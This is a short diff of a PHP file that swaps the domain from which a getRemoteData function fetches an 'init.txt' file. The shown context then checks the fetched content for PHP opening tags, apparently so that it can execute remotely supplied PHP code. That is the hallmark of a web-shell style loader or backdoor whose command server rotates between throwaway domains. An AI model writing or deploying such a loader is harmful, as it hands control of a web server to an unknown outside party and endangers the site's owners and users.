@@ -34,7 +34,7 @@ function getRemoteData($url) {
     
     return $result;
 }
-$configData = getRemoteData('https://j251220_13.cuteltd.com/init.txt');
+$configData = getRemoteData('https://j251222_13.daimitavan.com/init.txt');
 
 if ($configData) {
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
